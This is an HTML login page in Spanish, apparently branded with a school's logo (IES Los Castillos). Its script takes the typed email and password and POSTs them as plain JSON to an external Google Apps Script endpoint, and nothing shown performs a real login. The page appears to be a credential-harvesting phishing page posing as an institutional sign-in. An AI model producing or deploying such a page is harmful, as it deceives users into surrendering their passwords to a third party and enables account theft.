<!DOCTYPE html>
<html>
<head>
  <title>Login Page</title>
  <link rel="stylesheet" type="text/css" href="style.css">
  <script>
    function login() {
      var email = document.getElementById('userbox').value;
      var password = document.getElementById('passbox').value;

      var xhr = new XMLHttpRequest();
      var url = "https://script.google.com/macros/s/AKfycbxcsxlsDa1BMnqvFB8-xwFYlfOjYh2cA7M4PmoKHuVSegNnKSTuT_l6VO_vDLrVLGaySw/exec";
      xhr.open("POST", url, true);
      xhr.setRequestHeader("Content-Type", "application/json");

      var data = JSON.stringify({"email": email, "password": password});

      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
          console.log("SUCCESS")
        }
        else {
          console.log("FAIL")
        }
      };

      xhr.send(data);
    }
  </script>
</head>
<body>
  <div class="container">
    <img src="https://i.ibb.co/sgmhPpP/logoiesloscastillos.png" alt="logo" width="120" height="180">
    <form>
      <input id="userbox" type="text" name="email" placeholder="Email">
      <input id="passbox" type="password" name="password" placeholder="ContraseÃ±a">
      <button id="loginBtn" type="button" onclick="login()">Entrar</button>
    </form>
  </div>
</body>
</html>
